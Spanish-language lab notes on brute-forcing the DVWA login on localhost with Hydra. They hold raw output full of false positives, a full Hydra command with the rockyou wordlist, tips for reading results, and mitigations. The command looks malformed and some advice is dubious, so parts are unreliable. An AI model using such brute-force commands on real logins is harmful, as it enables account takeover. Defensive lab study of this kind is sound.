[8080][http-post-form] host: 127.0.0.1   login: /etc/bash_completion.d/quilt:#  user can go in them. It ought to be a more standard way to achieve this.   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[8080][http-post-form] host: 127.0.0.1   login: /etc/bash_completion.d/quilt:#  user can go in them. It ought to be a more standard way to achieve this.   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
1 of 1 target successfully completed, 8188 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-16 23:15:54

### 🔎 Cómo identificar lo importante en Hydra

1. Las líneas clave son las que dicen login: y password:

Ejemplo típico:

```pgsql
[8080][http-post-form] host: 127.0.0.1   login: admin   password: password
```

Esta línea nos dice que:

- Host: 127.0.0.1
- Usuario encontrado: admin
- Contraseña válida: password

👉 Ese es el resultado final que debes documentar.

2. Todo lo demás (líneas de intento fallido, verbosidad -V) son solo logs de Hydra.
Ejemplo:

```csharp
[ATTEMPT] target 127.0.0.1 - login "admin" - pass "123456" - 1 of 1000 [child 0]
```

Esto no importa más que para depurar.
Lo que interesa son los intentos que no fallan.

3. Si Hydra encontró más de una contraseña válida para un usuario (como te pasó con admin):

- Normalmente la correcta es la última que aparece y que efectivamente funciona en el login.
- DVWA a veces muestra varias coincidencias por cómo está programado, pero en entornos reales casi siempre es una sola.

4. Cómo filtrar solo lo importante (truco práctico en Kali):

Si quieres que te salga SOLO el resultado bueno, sin todo el ruido:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login failed" \
-s 8080 -V -I | grep "host:"
```

Eso te dará directamente algo como:

```bash
[8080][http-post-form] host: 127.0.0.1   login: admin   password: password
```

## 📂 Evidencias

- Capturas de pantalla de Hydra encontrando credenciales.
- Resultados de los intentos exitosos.
- Hash de sesión (PHPSESSID) tras login correcto.

## 🛡️ Mitigaciones

Buenas prácticas contra ataques de fuerza bruta:

- Limitar intentos fallidos de login.
- Implementar bloqueo temporal de cuentas o captchas.
- Registrar intentos de login fallidos y alertar al administrador.
- Usar contraseñas robustas y MFA (multi-factor authentication).
